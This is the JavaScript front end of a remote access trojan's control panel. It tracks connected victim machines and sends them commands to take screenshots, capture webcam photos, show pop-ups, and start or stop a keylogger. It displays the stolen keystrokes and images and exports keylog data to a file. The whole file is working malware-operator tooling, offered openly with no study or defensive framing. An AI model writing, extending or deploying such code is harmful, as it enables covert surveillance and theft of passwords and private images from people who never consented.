// RAT Control Panel JavaScript

// Global variables
let socket;
let connectedClients = {};
let selectedClient = null;

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    initializeWebSocket();
    initializeEventHandlers();
    updateUIState();
});

// WebSocket initialization
function initializeWebSocket() {
    socket = io();
    
    socket.on('connect', function() {
        console.log('Connected to server');
        updateConnectionStatus('Connected', 'success');
        addLogEntry('Connected to RAT Web Interface', 'success');
    });
    
    socket.on('disconnect', function() {
        console.log('Disconnected from server');
        updateConnectionStatus('Disconnected', 'warning');
        addLogEntry('Disconnected from RAT Web Interface', 'warning');
    });
    
    socket.on('server_status', function(data) {
        if (data.status === 'running') {
            updateServerStatus('Running', 'success');
            addLogEntry(`Server started on ${data.host}:${data.port}`, 'success');
        } else if (data.status === 'error') {
            updateServerStatus('Error', 'danger');
            addLogEntry(`Server error: ${data.message}`, 'error');
        }
    });
    
    socket.on('client_connected', function(data) {
        addClient(data);
        addLogEntry(`Client connected: ${data.client_id}`, 'info');
    });
    
    socket.on('client_disconnected', function(data) {
        removeClient(data.client_id);
        addLogEntry(`Client disconnected: ${data.client_id}`, 'warning');
    });
    
    socket.on('client_heartbeat', function(data) {
        updateClientHeartbeat(data.client_id);
    });
    
    socket.on('screenshot_received', function(data) {
        addScreenshot(data);
        addLogEntry(`Screenshot received from ${data.client_id}`, 'success');
    });
    
    socket.on('photo_received', function(data) {
        addPhoto(data);
        addLogEntry(`Photo received from ${data.client_id}`, 'success');
    });
    
    socket.on('keylog_data', function(data) {
        addKeylogData(data);
    });
    
    socket.on('keylog_status', function(data) {
        updateKeylogStatus(data);
        addLogEntry(`Keylogger ${data.payload.status} for ${data.client_id}`, 'info');
    });
    
    socket.on('popup_response', function(data) {
        addLogEntry(`Popup response from ${data.client_id}: ${JSON.stringify(data.response)}`, 'info');
    });
    
    socket.on('client_error', function(data) {
        addLogEntry(`Client error from ${data.client_id}: ${data.error}`, 'error');
    });
    
    socket.on('error', function(data) {
        addLogEntry(`Error: ${data.message}`, 'error');
    });
}

// Initialize event handlers
function initializeEventHandlers() {
    // Server control
    document.getElementById('start-server').addEventListener('click', startServer);
    
    // Command buttons
    document.getElementById('cmd-screenshot').addEventListener('click', sendScreenshotCommand);
    document.getElementById('cmd-photo').addEventListener('click', sendPhotoCommand);
    document.getElementById('cmd-popup').addEventListener('click', showPopupConfig);
    document.getElementById('cmd-keylog-start').addEventListener('click', sendKeylogStartCommand);
    document.getElementById('cmd-keylog-stop').addEventListener('click', sendKeylogStopCommand);
    document.getElementById('cmd-ping').addEventListener('click', sendPingCommand);
    document.getElementById('send-popup').addEventListener('click', sendPopupCommand);
    
    // Client selection
    document.getElementById('target-client').addEventListener('change', function() {
        selectedClient = this.value;
        updateCommandButtons();
    });
    
    // Clear log
    document.getElementById('clear-log').addEventListener('click', clearActivityLog);
    
    // Keylogger controls
    document.getElementById('clear-keylog').addEventListener('click', clearKeylogData);
    document.getElementById('export-keylog').addEventListener('click', exportKeylogData);
    
    // Refresh clients periodically
    setInterval(refreshClients, 5000);
}

// Server control functions
function startServer() {
    const host = document.getElementById('server-host').value;
    const port = document.getElementById('server-port').value;
    
    fetch('/api/server/start', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ host: host, port: parseInt(port) })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            addLogEntry(data.message, 'success');
            document.getElementById('start-server').disabled = true;
        } else {
            addLogEntry(data.message, 'error');
        }
    })
    .catch(error => {
        addLogEntry(`Error starting server: ${error}`, 'error');
    });
}

// Client management functions
function addClient(clientData) {
    connectedClients[clientData.client_id] = clientData;
    updateClientsList();
    updateTargetClientSelect();
}

function removeClient(clientId) {
    delete connectedClients[clientId];
    updateClientsList();
    updateTargetClientSelect();
    
    // Clear selection if removed client was selected
    if (selectedClient === clientId) {
        selectedClient = null;
        document.getElementById('target-client').value = '';
        updateCommandButtons();
    }
}

function updateClientHeartbeat(clientId) {
    if (connectedClients[clientId]) {
        connectedClients[clientId].lastHeartbeat = Date.now();
    }
}

function updateClientsList() {
    const clientsList = document.getElementById('clients-list');
    
    if (Object.keys(connectedClients).length === 0) {
        clientsList.innerHTML = '<p class="text-muted">No clients connected</p>';
        return;
    }
    
    let html = '';
    for (const [clientId, client] of Object.entries(connectedClients)) {
        const isActive = client.lastHeartbeat && (Date.now() - client.lastHeartbeat < 30000);
        html += `
            <div class="client-item ${isActive ? '' : 'disconnected'}" data-client-id="${clientId}">
                <div class="client-id">${clientId}</div>
                <div class="client-info">
                    IP: ${client.ip} | Port: ${client.port}
                    ${isActive ? '<span class="status-online">●</span>' : '<span class="status-offline">●</span>'}
                </div>
            </div>
        `;
    }
    clientsList.innerHTML = html;
}

function updateTargetClientSelect() {
    const select = document.getElementById('target-client');
    const currentValue = select.value;
    
    // Clear options except first
    select.innerHTML = '<option value="">Select a client...</option>';
    
    // Add client options
    for (const [clientId, client] of Object.entries(connectedClients)) {
        const option = document.createElement('option');
        option.value = clientId;
        option.textContent = `${clientId} (${client.ip})`;
        select.appendChild(option);
    }
    
    // Restore selection if still valid
    if (currentValue && connectedClients[currentValue]) {
        select.value = currentValue;
        selectedClient = currentValue;
    }
    
    updateCommandButtons();
}

function refreshClients() {
    fetch('/api/clients')
        .then(response => response.json())
        .then(clients => {
            // Update client status
            for (const client of clients) {
                if (connectedClients[client.id]) {
                    connectedClients[client.id].connected = client.connected;
                }
            }
            updateClientsList();
        })
        .catch(error => {
            console.error('Error refreshing clients:', error);
        });
}

// Command functions
function updateCommandButtons() {
    const hasClient = selectedClient && connectedClients[selectedClient];
    document.getElementById('cmd-screenshot').disabled = !hasClient;
    document.getElementById('cmd-photo').disabled = !hasClient;
    document.getElementById('cmd-popup').disabled = !hasClient;
    document.getElementById('cmd-keylog-start').disabled = !hasClient;
    document.getElementById('cmd-keylog-stop').disabled = !hasClient;
    document.getElementById('cmd-ping').disabled = !hasClient;
}

function sendScreenshotCommand() {
    if (!selectedClient) return;
    
    fetch('/api/command/screenshot', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error sending screenshot command: ${error}`, 'error');
    });
}

function sendPhotoCommand() {
    if (!selectedClient) return;
    
    fetch('/api/command/photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error sending photo command: ${error}`, 'error');
    });
}

function showPopupConfig() {
    const config = document.getElementById('popup-config');
    config.style.display = config.style.display === 'none' ? 'block' : 'none';
}

function sendPopupCommand() {
    if (!selectedClient) return;
    
    const title = document.getElementById('popup-title').value;
    const message = document.getElementById('popup-message').value;
    const type = document.getElementById('popup-type').value;
    
    fetch('/api/command/popup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            client_id: selectedClient,
            title: title,
            message: message,
            type: type
        })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
        // Hide config after sending
        document.getElementById('popup-config').style.display = 'none';
    })
    .catch(error => {
        addLogEntry(`Error sending popup command: ${error}`, 'error');
    });
}

function sendKeylogStartCommand() {
    if (!selectedClient) return;
    
    fetch('/api/command/keylog_start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error sending keylog start command: ${error}`, 'error');
    });
}

function sendKeylogStopCommand() {
    if (!selectedClient) return;
    
    fetch('/api/command/keylog_stop', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error sending keylog stop command: ${error}`, 'error');
    });
}

function sendPingCommand() {
    if (!selectedClient) return;
    
    fetch('/api/command/ping', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error sending ping command: ${error}`, 'error');
    });
}

// Screenshot functions
function addScreenshot(data) {
    const container = document.getElementById('screenshots-container');
    
    // Remove "no screenshots" message
    if (container.querySelector('p.text-muted')) {
        container.innerHTML = '';
    }
    
    const timestamp = new Date(data.timestamp * 1000).toLocaleString();
    
    const screenshotHtml = `
        <div class="col-md-4 screenshot-item fade-in">
            <div class="card">
                <img src="${data.url}" class="screenshot-thumbnail" 
                     onclick="showScreenshotModal('${data.url}', '${data.filename}')"
                     alt="Screenshot from ${data.client_id}">
                <div class="screenshot-info">
                    <strong>Client:</strong> ${data.client_id}<br>
                    <strong>Time:</strong> ${timestamp}
                </div>
            </div>
        </div>
    `;
    
    container.insertAdjacentHTML('afterbegin', screenshotHtml);
}

function showScreenshotModal(url, filename) {
    document.getElementById('modal-screenshot').src = url;
    document.getElementById('download-screenshot').href = url;
    document.getElementById('download-screenshot').download = filename;
    
    const modal = new bootstrap.Modal(document.getElementById('screenshotModal'));
    modal.show();
}

// Photo functions
function addPhoto(data) {
    const container = document.getElementById('photos-container');
    
    // Remove "no photos" message
    if (container.querySelector('p.text-muted')) {
        container.innerHTML = '';
    }
    
    const timestamp = new Date(data.timestamp * 1000).toLocaleString();
    
    const photoHtml = `
        <div class="col-md-6 screenshot-item fade-in">
            <div class="card">
                <img src="${data.url}" class="screenshot-thumbnail" 
                     onclick="showPhotoModal('${data.url}', '${data.filename}')"
                     alt="Photo from ${data.client_id}">
                <div class="screenshot-info">
                    <strong>Client:</strong> ${data.client_id}<br>
                    <strong>Time:</strong> ${timestamp}
                </div>
            </div>
        </div>
    `;
    
    container.insertAdjacentHTML('afterbegin', photoHtml);
}

function showPhotoModal(url, filename) {
    document.getElementById('modal-photo').src = url;
    document.getElementById('download-photo').href = url;
    document.getElementById('download-photo').download = filename;
    
    const modal = new bootstrap.Modal(document.getElementById('photoModal'));
    modal.show();
}

// Activity log functions
function addLogEntry(message, type = 'info') {
    const log = document.getElementById('activity-log');
    const timestamp = new Date().toLocaleTimeString();
    
    // Remove initial message
    if (log.querySelector('p.text-muted')) {
        log.innerHTML = '';
    }
    
    const entry = document.createElement('div');
    entry.className = `log-entry log-${type}`;
    entry.innerHTML = `
        <span class="log-time">[${timestamp}]</span> ${message}
    `;
    
    log.insertBefore(entry, log.firstChild);
    
    // Limit log entries
    const entries = log.querySelectorAll('.log-entry');
    if (entries.length > 100) {
        entries[entries.length - 1].remove();
    }
}

function clearActivityLog() {
    document.getElementById('activity-log').innerHTML = 
        '<p class="text-muted">Activity log cleared...</p>';
}

// UI update functions
function updateServerStatus(status, type) {
    const badge = document.getElementById('server-status');
    badge.textContent = `Server ${status}`;
    badge.className = `badge bg-${type} me-2`;
}

function updateConnectionStatus(status, type) {
    const badge = document.getElementById('connection-status');
    badge.textContent = status;
    badge.className = `badge bg-${type}`;
}

function updateUIState() {
    updateCommandButtons();
}

// Utility functions
function formatTime(timestamp) {
    return new Date(timestamp).toLocaleString();
}

function escapeHtml(unsafe) {
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
}

// Keylogger functions
function addKeylogData(data) {
    const container = document.getElementById('keylog-container');
    
    // Remove "no data" message
    if (container.querySelector('p.text-muted')) {
        container.innerHTML = '';
    }
    
    const timestamp = new Date(data.payload.timestamp * 1000).toLocaleString();
    const keylogData = escapeHtml(data.payload.data);
    
    const entry = document.createElement('div');
    entry.className = 'keylog-entry';
    entry.innerHTML = `
        <div class="keylog-header">
            <strong>Client:</strong> ${data.client_id} | 
            <strong>Time:</strong> ${timestamp}
        </div>
        <div class="keylog-data">${keylogData.replace(/\n/g, '<br>')}</div>
        <hr>
    `;
    
    container.appendChild(entry);
    
    // Auto-scroll to bottom
    container.scrollTop = container.scrollHeight;
    
    addLogEntry(`Keylog data received from ${data.client_id}`, 'info');
}

function updateKeylogStatus(data) {
    const statusBadge = document.getElementById('keylog-status');
    const status = data.payload.status;
    
    if (status === 'started') {
        statusBadge.textContent = 'Running';
        statusBadge.className = 'badge bg-success me-2';
        
        // Enable stop button, disable start button
        document.getElementById('cmd-keylog-start').disabled = true;
        document.getElementById('cmd-keylog-stop').disabled = false;
    } else if (status === 'stopped') {
        statusBadge.textContent = 'Stopped';
        statusBadge.className = 'badge bg-secondary me-2';
        
        // Enable start button, disable stop button  
        document.getElementById('cmd-keylog-start').disabled = false;
        document.getElementById('cmd-keylog-stop').disabled = true;
    } else {
        statusBadge.textContent = 'Not Running';
        statusBadge.className = 'badge bg-secondary me-2';
        
        // Reset button states
        updateCommandButtons();
    }
}

function clearKeylogData() {
    const container = document.getElementById('keylog-container');
    container.innerHTML = '<p class="text-muted">Keylogger data will appear here when started...</p>';
    addLogEntry('Keylog data cleared', 'info');
}

function exportKeylogData() {
    const container = document.getElementById('keylog-container');
    const entries = container.querySelectorAll('.keylog-entry');
    
    if (entries.length === 0) {
        addLogEntry('No keylog data to export', 'warning');
        return;
    }
    
    let exportData = 'RAT Keylogger Export\n';
    exportData += '===================\n\n';
    
    entries.forEach(entry => {
        const header = entry.querySelector('.keylog-header').textContent;
        const data = entry.querySelector('.keylog-data').textContent;
        exportData += header + '\n';
        exportData += data + '\n\n';
    });
    
    // Create and download file
    const blob = new Blob([exportData], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylog_export_${new Date().toISOString().slice(0, 19).replace(/:/g, '-')}.txt`;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
    
    addLogEntry('Keylog data exported', 'success');
} 